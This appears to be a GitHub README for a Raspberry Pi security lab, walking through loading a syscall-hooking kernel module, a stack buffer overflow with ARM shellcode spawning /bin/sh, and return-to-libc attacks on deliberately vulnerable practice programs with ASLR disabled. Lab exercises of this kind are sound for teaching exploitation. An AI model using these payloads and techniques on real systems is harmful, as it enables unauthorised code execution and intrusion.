# HackRPi
- [System Call Hooking](https://github.com/korkeep/HackRPi#system-call-hooking-)
- [Buffer Overflow](https://github.com/korkeep/HackRPi#buffer-overflow-)
- [Return-To-Libc](https://github.com/korkeep/HackRPi#return-to-libc-)
- [Return-Oriented Programming](https://github.com/korkeep/HackRPi#return-oriented-programming-)

## System Call Hooking 🐱‍💻
### Insert kernel files to RPi
- **Step 1**: Mount SD card  
```
kss@ubuntu:~/HackRPi$ sudo mkdir /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo mkdir /mnt/fs
kss@ubuntu:~/HackRPi$ sudo mount /dev/sdb1 /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo mount /dev/sdb2 /mnt/fs
```
- **Step 2**: Copy kernel image  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/zImage /mnt/raspi/kernel7.img
```
- **Step 3**: Copy modules  
```
kss@ubuntu:~/HackRPi$ sudo cp -r ./linux/4.4.50-v7+/ /mnt/fs/lib/modules/
```
- **Step 4**: Copy device tree blob  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/*.dtb /mnt/raspi/
```
- **Step 5**: Copy device tree blob overlays  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/*.dtb* /mnt/raspi/overlays
kss@ubuntu:~/HackRPi$ sudo cp ./linux/README /mnt/raspi/overlays
```
- **Step 6**: Unmount SD card  
```
kss@ubuntu:~/HackRPi$ sudo umount /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
```
### Kernel modification attack
- **Step 1**: Check malicious module  
![image](https://user-images.githubusercontent.com/20378368/107459865-6d6e1a80-6b9a-11eb-9713-7319c7e2b622.png)  
- **Step 2**: Check SD card  
![image](https://user-images.githubusercontent.com/20378368/107325262-d303cd80-6aec-11eb-85fe-6e6c9f196352.png)  
```
kss@ubuntu:~/HackRPi/Hook$ lsblk
```
- **Step 3**: Mount SD card  
```
kss@ubuntu:~/HackRPi/Hook$ sudo mount /dev/sdb1 /mnt/raspi
kss@ubuntu:~/HackRPi/Hook$ sudo mount /dev/sdb2 /mnt/fs
```
- **Step 4**: Copy malicious module  
```
kss@ubuntu:~/HackRPi/Hook$ cd ..
kss@ubuntu:~/HackRPi$ sudo cp -r ./Hook /mnt/fs/home/pi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
```
- **Step 5**: Insert malicious module to RPi  
```
pi@raspberrypi:~/Hook$ sudo insmod hooker.ko
```
- **Result**  
![image](https://user-images.githubusercontent.com/20378368/107734985-fecbc100-6d41-11eb-8e3c-b4e42875d89e.PNG)  

## Buffer Overflow 🐱‍💻
- **Step 1**: Unlock ASLR  
```
pi@korkeep:~/BOF $ sudo sysctl -w kernel.randomize_va_space=0
```
- **Step 2**: Compile without stack protection  
```
pi@korkeep:~/BOF $ gcc -fno-stack-protector -z execstack BOF.c -o BOF
```
- **Step 3**: Debugging with gdb  
```
pi@korkeep:~/BOF $ gdb -q BOF
(gdb) start
```
- **Step 4**: Disassemble main  
![image](https://user-images.githubusercontent.com/20378368/107657827-e1a6dc00-6cc8-11eb-9891-0387c6b8c34b.png)  
```
(gdb) disassemble main
```
- **Step 5**: Set a breakpoint to hack  
```
// Breakpoint target:
// 0x00010530 <+40>:    mov     r3, #0
(gdb) b *0x00010530
```
- **Step 6**: Analyze address state  
![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
```
(gdb) x/100x $sp-200
```
- **Step 7**: Buffer overflow using NOP sled  
```
// Target address: 0x7efff570
(gdb) run $(python -c 'print "\x01\x10\xa0\xe1"*17+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"+"AAAA"+"\x70\xf5\xff\x7e"')
```
- **Result**  
![image](https://user-images.githubusercontent.com/20378368/107658056-1dda3c80-6cc9-11eb-9173-69a569d9439f.png)  

## Return-To-Libc 🐱‍💻
### Original RTL attack scheme
- **Step 1**: Unlock ASLR  
```
pi@korkeep:~/RTL $ sudo sysctl -w kernel.randomize_va_space=0
```
- **Step 2**: Compile without stack protection  
![image](https://user-images.githubusercontent.com/20378368/107732766-87476300-6d3c-11eb-88cf-ee929dbae4ee.png)  
```
// To practice RTL attack, compile with all these options
// However, Raspberry Pi3 does not support some options
pi@korkeep:~/RTL $ gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pic -o RTL RTL.c
```
- **Step 3**: Debugging with gdb  
![image](https://user-images.githubusercontent.com/20378368/107732076-c70d4b00-6d3a-11eb-9929-fd4c3664b426.png)  
```
pi@korkeep:~/RTL $ gdb -q RTL
(gdb) start
```
- **Step 4**: Print system() address  
![image](https://user-images.githubusercontent.com/20378368/107729508-7bf03980-6d34-11eb-91f3-331a02ad046f.png)  
```
(gdb) print system
```
- **Step 5**: Find /bin/sh address  
![image](https://user-images.githubusercontent.com/20378368/107729545-90343680-6d34-11eb-8a79-fc45acf8ab5c.png)  
```
(gdb) find &system, +99999999, "/bin/sh"
```
- **Step 6**: RTL attack using system(), /bin/sh address  
```
// Target address: 0x76e9ffac, 0x76f83c68
(gdb) run $(python -c 'print("A"*16+"\xac\xff\xe9\x76"+"A"*4+"\x68\x3c\xf8\x76")')
```
### Alternative RTL attack scheme
- **Step 1**: Unlock ASLR  
```
pi@korkeep:~/RTL $ sudo sysctl -w kernel.randomize_va_space=0
```
- **Step 2**: Compile without stack protection  
```
// Instead, HackRPi provides alternative source to practice RTL
// system("/bin/sh") function is manually added at RTL.c
pi@korkeep:~/RTL $ gcc -fno-stack-protector -z execstack -fno-pic -o RTL RTL.c
```
- **Step 3**: Debugging with gdb  
```
pi@korkeep:~/RTL $ gdb -q RTL
(gdb) start
```
- **Step 4**: Disassemble rtl()  
![image](https://user-images.githubusercontent.com/20378368/107731737-0ab38500-6d3a-11eb-9b3e-07e1e3181b0b.png)  
```
(gdb) disassemble rtl
```
- **Step 5**: Find system(), /bin/sh address  
![image](https://user-images.githubusercontent.com/20378368/107734782-8ebd3b00-6d41-11eb-83c3-b4d42e5740ae.png)  
```
(gdb) x/x 0x10494
(gdb) x/s 0x10558
```
- **Step 6**: RTL attack using ldr address  
```
//Target: 0x00010488
(gdb) run $(python -c 'print("A"*16+"\x88\x04\x01")')
```
- **Result**  
![image](https://user-images.githubusercontent.com/20378368/107734200-3174ba00-6d40-11eb-8306-32b063492b3f.png)  

## Return-Oriented Programming 🐱‍💻